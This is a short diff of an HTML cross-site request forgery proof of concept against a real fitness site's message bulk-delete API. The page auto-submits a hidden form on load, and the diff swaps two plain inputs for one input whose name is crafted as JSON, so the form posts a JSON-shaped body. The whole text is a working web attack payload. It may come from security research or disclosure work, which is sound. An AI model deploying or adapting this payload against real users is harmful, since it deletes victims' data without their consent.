@@ -1,8 +1,7 @@
 <html>
   <body>
     <form id="csrf" action="https://www.myfitnesspal.com/api/services/messages/bulk_delete" method="POST" enctype="application/json">
-      <input type="hidden" name="item[]" value="216410964">
-      <input type="hidden" name="sent" value="false">
+      <input type="hidden" name='{"item":[216410201],"sent":false}'>
     </form>
     <script>
       document.getElementById("csrf").submit();
